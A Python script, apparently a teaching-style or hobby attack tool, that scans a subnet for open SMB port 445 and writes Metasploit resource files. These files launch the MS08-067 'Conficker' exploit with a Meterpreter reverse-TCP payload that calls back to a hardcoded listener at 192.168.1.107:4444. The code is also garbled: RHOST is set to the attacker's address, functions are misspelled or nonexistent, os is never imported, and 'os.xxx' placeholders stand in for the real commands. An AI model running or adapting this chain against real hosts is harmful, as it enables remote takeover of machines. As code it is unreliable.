import optparse
import nmap

def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + lhost + '\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('set LPORT ' + lport + '\n')
    configFile.write('exploit -j -z')

def generateHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('set LPORT ' + lport + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1')

def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Find target ' + host
                tgtHosts.append(host)
    return tgtHosts

def main():
    parser = optparse.OptionParser('usage %prog -H <target hosts>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target hosts')
    
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    
    if (tgtHost == None):
        print parser.usage
        exit(0)
    
    lhost = '192.168.1.107'
    lport = '4444'
    
    validHosts = finTgts(tgtHost)
    f = fopen('listen.rc', 'w')
    generateHandler(f, lhost, lport)
    f.close()
    os.xxx
    
    configFile = fopen('exploit.rc', 'w')
    for each in tgtHosts:
        confickerExploit(configFile, each, lhost, lport)
        os.xxxx
    configFile.close()

if __name__ == "__main__":
    main()
